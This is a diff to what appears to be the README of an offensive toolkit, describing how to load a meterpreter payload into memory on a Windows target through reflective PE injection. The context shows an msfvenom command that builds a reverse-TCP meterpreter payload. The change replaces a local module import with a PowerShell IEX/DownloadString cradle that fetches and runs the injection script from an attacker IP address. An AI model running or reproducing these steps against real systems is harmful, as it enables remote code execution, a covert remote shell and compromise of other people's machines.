@@ -19,9 +19,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork
 ```
 
 
-2. Upload the _Invoke-ReflectivePEInjection.ps1_ script in this repository to the target machine and import it using `Import-Module`:
+2. Import the _Invoke-ReflectivePEInjection.ps1_ script in this repository on the target machine:
 ```powershell
-Import-Module .\Invoke-ReflectivePEInjection.ps1
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.198/Invoke-ReflectivePEInjection.ps1')
 ```
 
 
